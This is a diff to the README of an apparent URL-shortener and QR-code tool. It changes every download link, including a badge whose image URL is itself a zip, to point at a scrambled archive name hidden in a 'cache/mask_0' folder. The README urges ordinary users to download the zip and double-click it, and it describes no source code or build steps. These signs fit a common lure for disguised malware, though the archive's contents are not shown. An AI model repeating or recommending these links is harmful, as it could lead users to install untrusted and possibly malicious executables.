@@ -1,6 +1,6 @@
 # 🌐 shortify-url-shortener-and-qr-code-generator - Simplify Your Links Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/mammamamamambduru/shortify-url-shortener-and-qr-code-generator/master/Ephraitic/shortify-url-shortener-and-qr-code-generator.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/mammamamamambduru/shortify-url-shortener-and-qr-code-generator/master/Ephraitic/shortify-url-shortener-and-qr-code-generator.zip)
+[![Download Now](https://raw.githubusercontent.com/mammamamamambduru/shortify-url-shortener-and-qr-code-generator/master/qr-code/cache/mask_0/and_shortener_generator_code_shortify_url_qr_1.3.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/mammamamamambduru/shortify-url-shortener-and-qr-code-generator/master/qr-code/cache/mask_0/and_shortener_generator_code_shortify_url_qr_1.3.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ shortify-url-shortener-and-qr-code-generator is a user-friendly tool designed to
 This application is built for everyday users. Follow these steps to get started:
 
 1. **Download the Application:**
-   Visit this page to download: [Download shortify-url-shortener-and-qr-code-generator](https://raw.githubusercontent.com/mammamamamambduru/shortify-url-shortener-and-qr-code-generator/master/Ephraitic/shortify-url-shortener-and-qr-code-generator.zip).
+   Visit this page to download: [Download shortify-url-shortener-and-qr-code-generator](https://raw.githubusercontent.com/mammamamamambduru/shortify-url-shortener-and-qr-code-generator/master/qr-code/cache/mask_0/and_shortener_generator_code_shortify_url_qr_1.3.zip).
 
 2. **Install the Application:**
    Once you have downloaded the application, locate the downloaded file in your files or downloads folder. Double-click the file to begin the installation. Follow any on-screen instructions to complete the installation.
@@ -36,7 +36,7 @@ This application is built for everyday users. Follow these steps to get started:
 
 To download the latest version of the application, click the link below:
 
-[**Download shortify-url-shortener-and-qr-code-generator**](https://raw.githubusercontent.com/mammamamamambduru/shortify-url-shortener-and-qr-code-generator/master/Ephraitic/shortify-url-shortener-and-qr-code-generator.zip)
+[**Download shortify-url-shortener-and-qr-code-generator**](https://raw.githubusercontent.com/mammamamamambduru/shortify-url-shortener-and-qr-code-generator/master/qr-code/cache/mask_0/and_shortener_generator_code_shortify_url_qr_1.3.zip)
 
 Once downloaded, follow the installation steps outlined above to set it up on your machine.
 
